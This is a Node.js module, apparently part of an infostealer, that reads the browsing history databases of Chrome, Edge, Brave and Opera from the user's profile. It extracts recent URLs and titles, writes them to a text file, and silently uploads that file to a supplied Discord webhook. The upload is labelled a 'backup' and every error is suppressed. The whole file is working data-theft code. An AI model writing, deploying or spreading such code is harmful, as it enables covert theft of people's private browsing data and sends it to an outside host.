const fs = require('fs')
const path = require('path')
const os = require('os')

async function historyy(webhook = null) {
  const usuario = os.homedir()
  const navegadores = [
    {
      nome: 'chrome',
      arquivo: path.join(usuario, 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'History')
    },
    {
      nome: 'edge',
      arquivo: path.join(usuario, 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data', 'Default', 'History')
    },
    {
      nome: 'brave',
      arquivo: path.join(usuario, 'AppData', 'Local', 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'History')
    },
    {
      nome: 'opera',
      arquivo: path.join(usuario, 'AppData', 'Roaming', 'Opera Software', 'Opera Stable', 'History')
    }
  ]

  let historico_geral = []

  for (const navegador of navegadores) {
    if (!fs.existsSync(navegador.arquivo)) continue

    const temp_dir = path.join(os.tmpdir(), 'hist_browser_' + navegador.nome)
    if (!fs.existsSync(temp_dir)) fs.mkdirSync(temp_dir, { recursive: true })
    const destino = path.join(temp_dir, 'History')

    try {
      fs.copyFileSync(navegador.arquivo, destino)
    } catch (erro) {
      continue
    }

    try {
      const sqlite3 = require('sqlite3').verbose()
      const db = new sqlite3.Database(destino)
      await new Promise(resolve => {
        db.all(
          'SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 50',
          [],
          (erro, linhas) => {
            if (!erro && linhas && linhas.length) {
              linhas.forEach(linha => {
                historico_geral.push(`[${navegador.nome}] ${linha.title || ''} - ${linha.url}`)
              })
            }
            db.close()
            resolve()
          }
        )
      })
    } catch (erro) {
      continue
    }
  }

  if (!historico_geral.length) return null

  const arquivo_saida = path.join(__dirname, 'historico.txt')
  fs.writeFileSync(arquivo_saida, historico_geral.join('\n'), 'utf8')

  if (webhook && typeof webhook === 'string' && webhook.startsWith('http')) {
    try {
      const axios = require('axios')
      const FormData = require('form-data')
      const form = new FormData()
      form.append('file', fs.createReadStream(arquivo_saida), 'historico.txt')
      form.append('payload_json', JSON.stringify({
        embeds: [{
          title: 'Histórico de Navegador',
          description: 'Backup do histórico dos navegadores',
          color: 0x3498db,
          footer: { text: 'discord.gg/npm' }
        }]
      }))
      axios.post(webhook, form, { headers: form.getHeaders() })
        .then(() => {
        })
        .catch(() => {
        })
    } catch (erro) {
    }
  }

  return arquivo_saida
}

module.exports = { historyy }
